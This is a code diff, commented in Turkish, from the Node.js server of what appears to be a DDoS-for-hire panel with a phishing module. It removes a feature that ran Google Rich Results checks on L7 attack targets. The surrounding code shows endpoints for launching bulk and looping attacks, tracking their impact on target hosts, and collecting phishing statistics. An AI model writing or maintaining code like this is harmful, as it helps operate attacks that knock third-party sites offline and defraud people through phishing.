@@ -16,7 +16,6 @@ const path = require('path');
 const { sendTelegram, initTelegram, esc } = require('./telegram');
 const phish = require('./phish');
 const { initImpact, getImpactForUser } = require('./impact');
-const rrt = require('./rrt');
 
 initTelegram();
 
@@ -1546,9 +1545,6 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
         concurrents: count,
         attackIds
       });
-      // Saldiri basladi: L7 hedefin Rich Results durumunu arka planda olc
-      // (L4/IP hedeflerde rich result aranmaz; 24s cache tekillestirir)
-      if (layer === 'L7') rrt.scheduleRrtCheck(host, { delayMs: 5000 });
     }
 
     res.json({
@@ -2071,8 +2067,6 @@ app.post('/api/stresse/loop', async (req, res) => {
     }
 
     res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
-    // Loop basladi: L7 hedefin Rich Results durumunu arka planda olc (bir kez; cache tekillestirir)
-    if (layer === 'L7') rrt.scheduleRrtCheck(host, { delayMs: 5000 });
     saveState();
   } catch (error) {
     handleEndpointError(res, error, 'Loop error');
@@ -2476,19 +2470,6 @@ app.get('/api/method-congestion', (req, res) => {
     return res.status(401).json({ status: 'error', message: 'Session required' });
   }
   res.json(getMethodCongestionSnapshot());
-});
-
-/**
- * GET /api/rrt
- * Google Rich Results Test sonuclari (testedAt desc) + kuyrukta bekleyen/calisan hostlar.
- */
-app.get('/api/rrt', (req, res) => {
-  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
-  if (!sessionId || !sessions[sessionId]) {
-    return res.status(401).json({ status: 'error', message: 'Session required' });
-  }
-  const state = rrt.getRrtState();
-  res.json({ status: 'success', ...state });
 });
 
 /**
@@ -3010,26 +2991,6 @@ app.get('/api/phish/stats', (req, res) => {
 loadState();
 // Etki Monitoru: aktif saldiri/loop hedeflerini check-host.net ile olcer.
 initImpact({ activeAttacks, activeLoops, sessions, getLoopOwner });
-// RRT ilk tarama: yeni launch beklenmeden, acilista sistemde zaten aktif olan
-// saldiri/loop hedeflerini de teste sok (24s cache tekrarlari engeller;
-// kuyruk seri calisir). Boot'un hemen ardinda degil, 20sn sonra baslar.
-setTimeout(() => {
-  try {
-    const hosts = new Set();
-    // Sadece L7 (URL) hedefleri: L4/IP icin rich result aranmaz
-    Object.values(activeAttacks).forEach((a) => { if (a.host && a.layer === 'L7') hosts.add(a.host); });
-    Object.values(activeLoops).forEach((l) => {
-      if (l && l.running !== false && l.params?.host && l.params?.layer === 'L7') hosts.add(l.params.host);
-    });
-    let scheduled = 0;
-    hosts.forEach((host) => {
-      if (rrt.scheduleRrtCheck(host, { delayMs: 5000 })) scheduled += 1;
-    });
-    if (scheduled > 0) console.log(`[rrt] acilis taramasi: ${scheduled} hedef kuyruga eklendi`);
-  } catch (err) {
-    console.warn('[rrt] acilis taramasi hatasi:', err.message);
-  }
-}, 20000);
 // Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
 // bazinda baz al.
 Object.values(activeAttacks).forEach((a) => {
